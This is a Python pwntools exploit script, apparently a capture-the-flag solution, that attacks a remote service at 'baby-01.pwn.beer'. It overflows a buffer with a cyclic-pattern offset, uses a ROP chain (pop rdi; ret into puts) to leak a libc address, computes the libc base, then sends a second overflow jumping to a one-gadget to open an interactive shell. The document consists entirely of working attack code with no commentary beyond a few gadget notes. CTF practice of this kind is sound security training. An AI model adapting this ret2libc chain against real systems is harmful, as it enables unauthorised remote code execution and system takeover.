from pwn import *

p = remote("baby-01.pwn.beer", 10002)# #gdb.attach(p)


p.recvuntil("input:")

buf = ""
buf += cyclic_find("gaaahaaaiaaaj") * "A"

# some misc area to write /bin/sh
bin_sh_ptr = 0x602000

#0x0000000000400783: pop rdi; ret;
pop_rdi_ret = p64(0x400783)
puts = p64(0x0400550)

buf += pop_rdi_ret
buf += p64(0x601fe0)
buf += puts


buf += p64(0x400698)
p.sendline(buf)

l = p.recvline()[1:-1]

print hexdump(l)

a = u64(l.ljust(8,"\x00"))

print hex(a)

libc_base = a - 0x800b0

print "base", hex(libc_base)

p.recvuntil("input:")

# 0x0000000000400536: ret;
ret = p64(0x0000000000400536)

buf = ""
buf += cyclic_find("gaaahaaaiaaaj") * "A"
buf += ret * 2 # pad so [rsp+0x40] = 0
buf += p64(libc_base + 0x4f322)

p.sendline(buf)

p.interactive()
